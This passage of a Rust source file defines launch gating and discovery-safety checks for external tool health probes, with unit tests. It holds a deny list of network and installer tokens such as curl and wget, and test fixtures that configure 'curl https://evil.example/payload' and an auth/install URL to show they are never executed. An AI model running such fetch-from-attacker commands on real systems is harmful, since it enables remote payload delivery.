    #[error("launch cancelled before handoff")]
    Cancelled,
}

/// Require a same-generation [`HealthState::Available`] entry before launch.
///
/// Pending / Missing / Incompatible / TimedOut / Failed / Unknown /
/// NotApplicable all fail closed. A generation mismatch (refresh race or
/// late result) fails closed. Callers that hold a cancel token should use
/// [`require_available_for_launch_uncancelled`].
pub fn require_available_for_launch<'a>(
    snapshot: &'a ExternalRuntimeSnapshot,
    id: &str,
    generation: u64,
) -> Result<&'a HealthEntry, LaunchGateError> {
    if snapshot.generation != generation {
        return Err(LaunchGateError::GenerationMismatch {
            expected: generation,
            actual: snapshot.generation,
        });
    }
    let entry = snapshot
        .get(id)
        .ok_or_else(|| LaunchGateError::MissingEntry(ExternalRuntimeId::new(id)))?;
    match &entry.state {
        HealthState::Available { .. } => Ok(entry),
        other => Err(LaunchGateError::NotAvailable {
            id: entry.id.clone(),
            state: other.clone(),
        }),
    }
}

/// Same as [`require_available_for_launch`], but also fails closed when
/// cancellation occurred before OS handoff. Late health completion after
/// cancel cannot authorize launch.
pub fn require_available_for_launch_uncancelled<'a>(
    snapshot: &'a ExternalRuntimeSnapshot,
    id: &str,
    generation: u64,
    cancel: &super::probe::CancelToken,
) -> Result<&'a HealthEntry, LaunchGateError> {
    if cancel.is_cancelled() {
        return Err(LaunchGateError::Cancelled);
    }
    require_available_for_launch(snapshot, id, generation)
}

// ── Discovery safety ────────────────────────────────────────────────────────

/// Tokens that must never appear in trusted-catalog probe argv (discovery
/// must not auth, install, open browsers, run package managers, or hit the
/// network).
const FORBIDDEN_DISCOVERY_ARGV_TOKENS: &[&str] = &[
    "auth",
    "login",
    "logout",
    "install",
    "uninstall",
    "upgrade",
    "update",
    "http://",
    "https://",
    "curl",
    "wget",
    "browser",
    "open",
    "apt-get",
    "brew",
    "winget",
    "dnf",
    "pacman",
    "npm",
    "pip",
    "pip3",
    "npx",
];

/// Assert discovery/probe argv is free of auth, installer, browser, package
/// manager, and network request tokens. Used by tests and as a design guard.
pub fn discovery_probe_argv_is_safe(argv: &[String]) -> Result<(), String> {
    for arg in argv {
        let lower = arg.to_ascii_lowercase();
        for forbidden in FORBIDDEN_DISCOVERY_ARGV_TOKENS {
            if lower == *forbidden || lower.contains(forbidden) {
                return Err(format!(
                    "discovery probe argv must not contain `{forbidden}` (saw `{arg}`)"
                ));
            }
        }
    }
    Ok(())
}

/// Validate every trusted-catalog adapter's version/functional argv against
/// the discovery safety policy.
pub fn assert_catalog_discovery_is_safe(
    descriptors: &[ExternalRuntimeDescriptor],
) -> Result<(), String> {
    for desc in descriptors {
        match &desc.probe_policy {
            ProbePolicy::TrustedCatalog(policy) => {
                discovery_probe_argv_is_safe(policy.version_argv())?;
                if let Some(func) = policy.functional_argv() {
                    discovery_probe_argv_is_safe(func)?;
                }
            }
            ProbePolicy::ConfiguredCommand { .. } => {
                // Configured commands never execute during discovery.
            }
        }
    }
    Ok(())
}

/// Discovery performs no auth flow, installer, browser, package manager, or
/// network request. This is a design constant enforced by catalog argv
/// policy and ConfiguredCommand resolution-only evaluation.
pub fn discovery_side_effects_forbidden() -> bool {
    true
}

// ── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use std::path::Path;
    use std::sync::atomic::Ordering;

    use super::*;
    use crate::external_runtime::{
        CancelToken, EvaluationContext, HealthCause, HealthSnapshotStore, HostPlatform,
        ProbeDeadlines, ProbePolicy, RecordingProbeExecutor, evaluate_descriptor, refresh_snapshot,
    };

    fn ctx(platform: HostPlatform) -> EvaluationContext {
        EvaluationContext::new(platform)
    }

    fn ctx_features(platform: HostPlatform, features: &[&str]) -> EvaluationContext {
        EvaluationContext::new(platform).with_features(features.iter().copied())
    }

    fn success_handler() -> impl Fn(&Path, &[String]) -> crate::external_runtime::ProbeCommandResult
    {
        |_program, _args| crate::external_runtime::ProbeCommandResult {
            exit_code: Some(0),
            stdout: b"1.2.3\n".to_vec(),
            stderr: Vec::new(),
            timed_out: false,
            cancelled: false,
            spawn_error: None,
        }
    }

    #[test]
    fn external_dependency_adapter_inventory() {
        let expected: BTreeSet<&str> = known_catalog_adapter_ids().iter().copied().collect();
        let descriptors = catalog_adapter_descriptors();
        let actual: BTreeSet<&str> = descriptors.iter().map(|d| d.id.as_str()).collect();

        let missing: Vec<_> = expected.difference(&actual).copied().collect();
        let extra: Vec<_> = actual.difference(&expected).copied().collect();
        assert!(
            missing.is_empty(),
            "known catalog inventory missing adapters: {missing:?}"
        );
        assert!(
            extra.is_empty(),
            "known catalog inventory has unexpected adapters: {extra:?}"
        );
        assert_eq!(descriptors.len(), known_catalog_adapter_ids().len());

        // Exact ordered roster matches the prompt inventory.
        assert_eq!(
            known_catalog_adapter_ids(),
            &[
                ID_GIT,
                ID_LAZYGIT,
                ID_GH,
                ID_KCL,
                ID_HARNESS_CLAUDE,
                ID_HARNESS_CODEX,
                ID_HARNESS_GEMINI,
                ID_HARNESS_OPENCODE,
                ID_ACCEL_RG,
                ID_ACCEL_FD,
                ID_ACCEL_GSED,
                ID_JQ_EXTERNAL,
            ]
        );

        // Every known entry is trusted-catalog and executable.
        for desc in &descriptors {
            assert!(
                desc.probe_policy.is_trusted_catalog(),
                "{} must be TrustedCatalog",
                desc.id
            );
            assert!(
                desc.probe_policy
                    .as_trusted_catalog()
                    .unwrap()
                    .is_executable(),
                "{} catalog policy must be catalog-minted",
                desc.id
            );
        }

        // Register into a registry without duplicates.
        let registry = ExternalRuntimeRegistry::new();
        register_integration_adapters(&registry).unwrap();
        assert_eq!(registry.len(), known_catalog_adapter_ids().len());
        for id in known_catalog_adapter_ids() {
            assert!(registry.get(id).is_some(), "missing registration {id}");
        }

        // Dynamic configured IDs are not part of the known catalog set.
        assert!(!expected.contains("harness.custom.my-agent"));
        assert!(!expected.contains("lsp.rust-analyzer"));
        assert!(!expected.contains("mcp.stdio.filesystem"));
    }

    #[test]
    fn external_dependency_git_integrations() {
        let registry = ExternalRuntimeRegistry::new();
        register_integration_adapters(&registry).unwrap();

        for id in [ID_GIT, ID_LAZYGIT, ID_GH] {
            let desc = registry.get(id).expect(id);
            assert_eq!(desc.importance, DependencyImportance::OptionalIntegration);
            assert!(desc.probe_policy.is_trusted_catalog());
            assert!(matches!(desc.remedy, RemedyKind::PlatformRecipes { .. }));
        }

        let executor = RecordingProbeExecutor::new()
            .with_resolve("git", "/usr/bin/git")
            .with_resolve("lazygit", "/usr/bin/lazygit")
            .with_resolve("gh", "/usr/bin/gh");
        executor.set_handler(success_handler());

        let descriptors: Vec<_> = [ID_GIT, ID_LAZYGIT, ID_GH]
            .iter()
            .map(|id| registry.get(id).unwrap())
            .collect();
        let snap = refresh_snapshot(
            1,
            &descriptors,
            &executor,
            None,
            Path::new("/"),
            &ctx(HostPlatform::GenericLinux),
            ProbeDeadlines::default(),
            &CancelToken::new(),
        );

        for id in [ID_GIT, ID_LAZYGIT, ID_GH] {
            assert!(
                matches!(snap.get(id).unwrap().state, HealthState::Available { .. }),
                "{id} should be Available when on PATH"
            );
        }

        // Install-versus-auth separation for gh:
        // Available binary health never implies authentication.
        let gh_state = &snap.get(ID_GH).unwrap().state;
        assert!(!gh_binary_health_implies_auth(gh_state));
        assert!(!discovery_performs_gh_auth());
        assert_eq!(
            GhAuthState::NotCheckedDuringDiscovery,
            GhAuthState::NotCheckedDuringDiscovery
        );
        // Probe argv is version-only — never `gh auth …`.
        for run in executor.run_log.lock().unwrap().iter() {
            assert_eq!(run.args, vec!["--version".to_string()]);
            assert!(!run.args.iter().any(|a| a.contains("auth")));
            assert!(!run.args.iter().any(|a| a.contains("login")));
        }
    }

    #[test]
    fn external_dependency_harness_and_kcl() {
        let registry = ExternalRuntimeRegistry::new();
        register_integration_adapters(&registry).unwrap();

        // Four known presets + KCL.
        for (id, feature, candidate) in [
            (ID_HARNESS_CLAUDE, "harness.claude", "claude"),
            (ID_HARNESS_CODEX, "harness.codex", "codex"),
            (ID_HARNESS_GEMINI, "harness.gemini", "gemini"),
            (ID_HARNESS_OPENCODE, "harness.opencode", "opencode"),
            (ID_KCL, "kcl", "kcl"),
        ] {
            let desc = registry.get(id).expect(id);
            assert_eq!(desc.owner.feature, feature);
            assert!(desc.probe_policy.is_trusted_catalog());
            assert!(desc.executable_candidates.iter().any(|c| c == candidate));
        }
        assert_eq!(
            known_harness_preset_names(),
            &["claude", "codex", "gemini", "opencode"]
        );

        // Custom harness: ConfiguredCommand only, no guessed package recipe
        // even when the executable name resembles a known package.
        let custom = ConfiguredCommandInput::new("my-wrapper", "docker")
            .with_args(["--evil", "run", "rm", "-it"]);
        let custom_id = upsert_custom_harness(&registry, &custom).unwrap();
        assert_eq!(custom_id.as_str(), "harness.custom.my-wrapper");
        let custom_desc = registry.get(custom_id.as_str()).unwrap();
        assert!(custom_desc.probe_policy.is_configured_command());
        assert!(matches!(
            custom_desc.remedy,
            RemedyKind::ConfigGuidance { .. }
        ));
        let rendered = custom_desc.remedy.render_for(HostPlatform::DebianUbuntu);
        assert!(!rendered.to_ascii_lowercase().contains("apt-get install"));
        assert!(!rendered.to_ascii_lowercase().contains("brew install"));

        // Default preset command is not re-registered as custom.
        let ids = upsert_custom_harnesses(
            &registry,
            [
                ConfiguredCommandInput::new("claude", "claude"),
                ConfiguredCommandInput::new("weird", "my-agent"),
            ],
        )
        .unwrap();
        assert_eq!(ids.len(), 1);
        assert_eq!(ids[0].as_str(), "harness.custom.weird");

        // Custom override of a preset name becomes ConfiguredCommand.
        let override_id = upsert_custom_harness(
            &registry,
            &ConfiguredCommandInput::new("claude", "my-claude-wrapper"),
        )
        .unwrap();
        assert_eq!(override_id.as_str(), "harness.custom.claude");
        assert!(
            registry
                .get("harness.custom.claude")
                .unwrap()
                .probe_policy
                .is_configured_command()
        );
        // Catalog preset remains TrustedCatalog.
        assert!(
            registry
                .get(ID_HARNESS_CLAUDE)
                .unwrap()
                .probe_policy
                .is_trusted_catalog()
        );

        // KCL is only the current kcl binary — no legacy fallback candidates.
        let kcl = registry.get(ID_KCL).unwrap();
        assert_eq!(kcl.executable_candidates, vec!["kcl".to_string()]);
        assert!(
            !kcl.executable_candidates
                .iter()
                .any(|c| c.contains("legacy"))
        );
    }

    #[test]
    fn external_dependency_lsp_and_stdio_mcp() {
        let registry = ExternalRuntimeRegistry::new();
        register_integration_adapters(&registry).unwrap();

        let lsp_inputs = [
            ConfiguredCommandInput::new("rust-analyzer", "rust-analyzer").with_args(["--stdio"]),
            ConfiguredCommandInput::new("pyright", "pyright-langserver")
                .with_args(["--stdio"])
                .with_exact_path("/opt/pyright/pyright-langserver"),
            lsp_command_input("gopls", &["gopls".into(), "serve".into()]).unwrap(),
        ];
        let lsp_ids = upsert_lsp_servers(&registry, lsp_inputs).unwrap();
        assert_eq!(
            lsp_ids
                .iter()
                .map(|i| i.as_str().to_string())
                .collect::<Vec<_>>(),
            vec![
                "lsp.rust-analyzer".to_string(),
                "lsp.pyright".to_string(),
                "lsp.gopls".to_string(),
            ]
        );

        let mcp_inputs = [
            mcp_stdio_input(
                "filesystem",
                "npx",
                &[
                    "-y".into(),
                    "@modelcontextprotocol/server-filesystem".into(),
                ],
            ),
            mcp_stdio_input("custom", "/opt/mcp/server", &["--flag".into()]),
        ];
        let mcp_ids = upsert_stdio_mcp_servers(&registry, mcp_inputs).unwrap();
        assert_eq!(
            mcp_ids
                .iter()
                .map(|i| i.as_str().to_string())
                .collect::<Vec<_>>(),
            vec![
                "mcp.stdio.filesystem".to_string(),
                "mcp.stdio.custom".to_string(),
            ]
        );

        // Every configured command is ConfiguredCommand (resolution only).
        for id in lsp_ids.iter().chain(mcp_ids.iter()) {
            let desc = registry.get(id.as_str()).unwrap();
            assert!(
                desc.probe_policy.is_configured_command(),
                "{id} must be ConfiguredCommand"
            );
            assert!(matches!(desc.remedy, RemedyKind::ConfigGuidance { .. }));
        }

        // Absolute MCP path is stored as exact_path.
        match &registry.get("mcp.stdio.custom").unwrap().probe_policy {
            ProbePolicy::ConfiguredCommand {
                command: _,
                exact_path: Some(p),
            } => {
                assert_eq!(p, Path::new("/opt/mcp/server"));
            }
            other => panic!("expected exact_path configured command, got {other:?}"),
        }

        // Feature-local LSP install confirmation boundary is preserved:
        // health descriptors carry no install_command and never invoke
        // package managers / install recipes. Install confirmation remains
        // in daemon/lsp (`LspAutoInstall::Ask`).
        for id in &lsp_ids {
            let desc = registry.get(id.as_str()).unwrap();
            let remedy = desc.remedy.render_for(HostPlatform::DebianUbuntu);
            assert!(!remedy.contains("apt-get install"));
            assert!(!remedy.contains("npm install"));
            assert!(!remedy.to_ascii_lowercase().contains("auto_install"));
        }
    }

    #[test]
    fn external_dependency_optional_accelerators() {
        let registry = ExternalRuntimeRegistry::new();
        register_integration_adapters(&registry).unwrap();

        for id in [ID_ACCEL_RG, ID_ACCEL_FD, ID_ACCEL_GSED, ID_JQ_EXTERNAL] {
            let desc = registry.get(id).expect(id);
            assert_eq!(
                desc.importance,
                DependencyImportance::OptionalAccelerator,
                "{id} must be OptionalAccelerator so missing never makes base Cockpit unhealthy"
            );
            assert!(desc.probe_policy.is_trusted_catalog());
        }

        // Built-in applet means no false host-jq requirement for Cockpit-owned jq.
        assert!(!cockpit_owned_jq_requires_host_jq());
        assert_eq!(external_jq_adapter_id(), ID_JQ_EXTERNAL);

        // External jq is WhenFeatureSelected — not a default-safety requirement.
        let jq = registry.get(ID_JQ_EXTERNAL).unwrap();
        assert!(matches!(
            jq.applicability,
            Applicability::WhenFeatureSelected
        ));

        // Missing accelerators → Missing state, OptionalAccelerator importance.
        let executor = RecordingProbeExecutor::new(); // nothing resolves
        executor.set_handler(success_handler());
        let accel: Vec<_> = [ID_ACCEL_RG, ID_ACCEL_FD, ID_ACCEL_GSED]
            .iter()
            .map(|id| registry.get(id).unwrap())
            .collect();
        let snap = refresh_snapshot(
            1,
            &accel,
            &executor,
            None,
            Path::new("/"),
            &ctx(HostPlatform::GenericLinux),
            ProbeDeadlines::default(),
            &CancelToken::new(),
        );
        for id in [ID_ACCEL_RG, ID_ACCEL_FD, ID_ACCEL_GSED] {
            let entry = snap.get(id).unwrap();
            assert!(matches!(entry.state, HealthState::Missing));
            assert_eq!(entry.importance, DependencyImportance::OptionalAccelerator);
        }

        // jq external NotApplicable when feature not selected.
        let jq_snap = refresh_snapshot(
            2,
            std::slice::from_ref(&jq),
            &executor,
            None,
            Path::new("/"),
            &ctx(HostPlatform::GenericLinux),
            ProbeDeadlines::default(),
            &CancelToken::new(),
        );
        assert!(matches!(
            jq_snap.get(ID_JQ_EXTERNAL).unwrap().state,
            HealthState::NotApplicable
        ));
    }

    #[test]
    fn configured_command_adapter_never_executes() {
        // Production Settings/doctor composition path with a recording executor:
        // arbitrary configured harness/LSP/MCP must resolve without any spawn.
        let harness = ConfiguredCommandInput::new("evil-harness", "evil-bin").with_args([
            "--auth",
            "login",
            "https://evil.example/install",
        ]);
        let lsp = ConfiguredCommandInput::new("evil-lsp", "/tmp/evil-lsp")
            .with_exact_path("/tmp/evil-lsp")
            .with_args(["--install", "all"]);
        let mcp = ConfiguredCommandInput::new("evil-mcp", "curl")
            .with_args(["https://evil.example/payload"]);

        let executor = RecordingProbeExecutor::new()
            .with_resolve("evil-bin", "/opt/evil-bin")
            .with_resolve("curl", "/usr/bin/curl");
        executor
            .spawnable
            .lock()
            .unwrap()
            .insert(PathBuf::from("/tmp/evil-lsp"));
        executor.set_handler(|_p, args| {
            panic!("configured command health must never spawn; args={args:?}");
        });

        let input = IntegrationHealthComposeInput {
            harnesses: vec![harness],
            lsp_servers: vec![lsp],
            stdio_mcp: vec![mcp],
            sandbox_enabled: None,
            selected_features: BTreeSet::new(),
        };
        // Isolate global store between tests that share the process registry.
        global_health_store().clear();
        let snap =
            compose_settings_doctor_health_with_executor(Path::new("/"), &input, &executor, None)
                .expect("compose settings/doctor health");

        // Settings/doctor health reaches no spawn seam.
        assert_eq!(executor.run_count.load(Ordering::SeqCst), 0);
        assert!(executor.run_log.lock().unwrap().is_empty());

        let h_id = custom_harness_id("evil-harness");
        let l_id = lsp_server_id("evil-lsp");
        let m_id = stdio_mcp_id("evil-mcp");
        assert!(matches!(
            snap.get(h_id.as_str()).unwrap().state,
            HealthState::Available { .. }
        ));
        assert!(matches!(
            snap.get(l_id.as_str()).unwrap().state,
            HealthState::Available { .. }
        ));
        assert!(matches!(
            snap.get(m_id.as_str()).unwrap().state,
            HealthState::Available { .. }
        ));
        // Published into the shared store for the composed generation.
        let published = global_health_store().current().unwrap();
        assert_eq!(published.generation, snap.generation);

        // Configured args are never present on the probe policy type.
        let registry = super::super::registry::global_registry();
        for id in [h_id.as_str(), l_id.as_str(), m_id.as_str()] {
            match &registry.get(id).unwrap().probe_policy {
                ProbePolicy::ConfiguredCommand {
                    command: _,
                    exact_path: _,
                } => {}
                ProbePolicy::TrustedCatalog(_) => {
                    panic!("{id} must not inherit a trusted catalog recipe")
                }
            }
        }
    }

    #[test]
    fn live_launch_gate_fails_closed_on_cancel() {
        let _ = ensure_integration_adapters_registered(&super::super::registry::global_registry());
        let cancel = CancelToken::new();
        cancel.cancel();
        let err =
            require_live_available_for_launch_with_cancel(ID_GIT, Path::new("/"), Some(&cancel))
                .unwrap_err();
        assert_eq!(err, LaunchGateError::Cancelled);
    }

    #[test]
    fn adapter_launch_requires_same_generation_available() {
        let id = ID_GIT;
        let make_entry = |state: HealthState| HealthEntry {
            id: ExternalRuntimeId::new(id),
            state,
            importance: DependencyImportance::OptionalIntegration,
            target: ExecutionTarget::Host,
            remedy: None,
            platform: HostPlatform::GenericLinux,
        };

        // Every non-Available state fails closed.
        let non_available = [
            HealthState::Pending,
            HealthState::Missing,
            HealthState::Incompatible {
                detail: "old".into(),
            },
            HealthState::TimedOut,
            HealthState::Failed {
                cause: HealthCause::NotSpawnable,
            },
            HealthState::Unknown {
                cause: HealthCause::Cancellation,
            },
            HealthState::NotApplicable,
        ];
        for state in non_available {
            let mut snap = ExternalRuntimeSnapshot::empty(7, HostPlatform::GenericLinux);
            snap.entries.insert(id.into(), make_entry(state.clone()));
            let err = require_available_for_launch(&snap, id, 7).unwrap_err();
            assert!(
                matches!(err, LaunchGateError::NotAvailable { .. }),
                "expected NotAvailable for {state:?}, got {err:?}"
            );
        }

        // Available + same generation succeeds.
        let mut ok = ExternalRuntimeSnapshot::empty(7, HostPlatform::GenericLinux);
        ok.entries.insert(
            id.into(),
            make_entry(HealthState::Available {
                resolved_path: Some(PathBuf::from("/usr/bin/git")),
                version_evidence: Some("2.40.0".into()),
            }),
        );
        assert!(require_available_for_launch(&ok, id, 7).is_ok());

        // Generation mismatch (refresh race / late result) fails closed.
        let err = require_available_for_launch(&ok, id, 8).unwrap_err();
        assert_eq!(
            err,
            LaunchGateError::GenerationMismatch {
                expected: 8,
                actual: 7
            }
        );

        // Missing entry fails closed.
        let empty = ExternalRuntimeSnapshot::empty(1, HostPlatform::GenericLinux);
        assert!(matches!(
            require_available_for_launch(&empty, id, 1),
            Err(LaunchGateError::MissingEntry(_))
        ));

        // Cancellation before handoff fails closed even if snapshot is Available.
        let cancel = CancelToken::new();
        cancel.cancel();
        let err = require_available_for_launch_uncancelled(&ok, id, 7, &cancel).unwrap_err();
        assert_eq!(err, LaunchGateError::Cancelled);

        // Late older generation cannot publish over a newer one, so launch
        // against the current generation cannot see stale Available from g1.
        let store = HealthSnapshotStore::new();
        let g1 = store.begin_refresh();
        let g2 = store.begin_refresh();
        let mut late = ExternalRuntimeSnapshot::empty(g1, HostPlatform::GenericLinux);
        late.entries.insert(
            id.into(),
            make_entry(HealthState::Available {
                resolved_path: None,
                version_evidence: None,
            }),
        );
        let mut current = ExternalRuntimeSnapshot::empty(g2, HostPlatform::GenericLinux);
        current
            .entries
            .insert(id.into(), make_entry(HealthState::Missing));
        assert!(!store.publish(late));
        assert!(store.publish(current));
        let published = store.current().unwrap();
        assert_eq!(published.generation, g2);
        // Launch gated on g2 sees Missing, not the discarded late Available.
        assert!(matches!(
            require_available_for_launch(&published, id, g2),
            Err(LaunchGateError::NotAvailable { .. })
        ));
        // Launch gated on the discarded generation fails generation mismatch.
        assert!(matches!(
            require_available_for_launch(&published, id, g1),
            Err(LaunchGateError::GenerationMismatch { .. })
        ));
    }

    #[test]
    fn discovery_performs_no_auth_installer_browser_package_manager_or_network() {
        assert!(discovery_side_effects_forbidden());
        assert!(!discovery_performs_gh_auth());
        assert!(!cockpit_owned_jq_requires_host_jq());

        let descriptors = catalog_adapter_descriptors();
        assert_catalog_discovery_is_safe(&descriptors).expect("catalog discovery must be safe");

        for desc in &descriptors {
            let policy = desc.probe_policy.as_trusted_catalog().unwrap();
            // Only version probes (no functional side-effect probes today).
            assert_eq!(policy.version_argv(), &["--version".to_string()]);
            assert!(policy.functional_argv().is_none());
            discovery_probe_argv_is_safe(policy.version_argv()).unwrap();
        }

        // Configured command path never reaches the run seam (covered above);
        // additionally, remedies for configured commands never embed package
        // manager install verbs as executable actions — they are guidance only.
        let custom = ConfiguredCommandInput::new("x", "something-unknown");
        let registry = ExternalRuntimeRegistry::new();
        let id = upsert_custom_harness(&registry, &custom).unwrap();
        let desc = registry.get(id.as_str()).unwrap();
        assert!(desc.probe_policy.is_configured_command());
        let executor = RecordingProbeExecutor::new();
        let _ = evaluate_descriptor(
            &desc,
            &executor,
            None,
            Path::new("/"),
            &ctx_features(HostPlatform::GenericLinux, &["harness.custom.x"]),
            ProbeDeadlines::default(),
            &CancelToken::new(),
        );
        assert_eq!(executor.run_count.load(Ordering::SeqCst), 0);

        // Forbidden argv detection works.
        assert!(discovery_probe_argv_is_safe(&["auth".into(), "login".into()]).is_err());
        assert!(discovery_probe_argv_is_safe(&["--version".into()]).is_ok());
    }

    #[test]
    fn invocation_roster_retains_configured_rows_for_deadline_projection() {
        let input = IntegrationHealthComposeInput {
            harnesses: vec![ConfiguredCommandInput::new("private", "private-harness")],
            lsp_servers: vec![ConfiguredCommandInput::new(
                "private-lsp",
                "language-server",
            )],
            stdio_mcp: vec![ConfiguredCommandInput::new("private-mcp", "mcp-server")],
            sandbox_enabled: Some(false),
            selected_features: BTreeSet::new(),
        };
        let descriptors = invocation_descriptor_roster(&input).unwrap();
        for id in [
            "harness.custom.private",
            "lsp.private-lsp",
            "mcp.stdio.private-mcp",
        ] {
            let descriptor = descriptors
                .iter()
                .find(|descriptor| descriptor.id.as_str() == id)
                .unwrap_or_else(|| panic!("missing invocation-private descriptor {id}"));
            let mut snapshot = ExternalRuntimeSnapshot::empty(7, HostPlatform::GenericLinux);
            snapshot.entries.insert(
                id.to_owned(),
                HealthEntry {
                    id: descriptor.id.clone(),
                    state: HealthState::Pending,
                    importance: descriptor.importance,
                    target: descriptor.target,
                    remedy: Some(descriptor.remedy.clone()),
                    platform: HostPlatform::GenericLinux,
                },
            );
            let frozen = super::super::projection::freeze_pending_as_timed_out(&snapshot);
            let projection = super::super::projection::project_dependencies(
                Some(&frozen),
                std::slice::from_ref(descriptor),
            );
            assert_eq!(projection.rows[0].id, id);
            assert_eq!(
                projection.rows[0].state,
                super::super::projection::DependencyViewState::TimedOut
            );
            assert_eq!(projection.rows[0].target, descriptor.target);
            assert!(projection.rows[0].remedy.is_some());
        }
    }
}
